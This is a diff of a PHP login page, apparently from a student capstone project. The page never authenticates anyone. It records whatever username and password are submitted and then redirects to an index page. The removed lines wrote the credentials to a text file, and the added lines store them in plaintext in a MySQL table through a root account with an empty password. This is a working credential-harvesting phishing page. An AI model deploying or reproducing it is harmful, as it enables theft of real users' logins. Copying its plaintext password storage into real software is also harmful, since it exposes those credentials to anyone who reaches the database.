@@ -3,20 +3,24 @@
   <title>Login</title>
  </head>
  <body>
+<?php  
 
-<?php
-
-if ($_POST['Login']){
-
-$myFile = "login.txt";
-$fh = fopen($myFile, 'a') or die("can't open file");
-$stringData = $_POST['username'] . ":";
-fwrite($fh, $stringData);
-$stringData = $_POST['password'] . "\n";
-fwrite($fh, $stringData);
-fclose($fh);
-
-} ?>
+    $username = $_POST['username'];
+    $password = $_POST['psw'];
+     
+    $conn = new mysqli('localhost', 'root', '', 'capstone');
+    if($conn->connect_error){
+        die('Connection Failed : '.$conn->connect_error);
+    }
+    else {
+        $stmt = $conn->prepare("INSERT into login(username, password) values(?, ?)");
+        $stmt->bind_param("ss", $username, $password);
+        $stmt->execute();
+        $stmt->close();
+    }
+    
+    mysqli_close($conn);
+ ?>
 
 <script>location.href="/cs490-capstone/index.html#";</script>
 	 
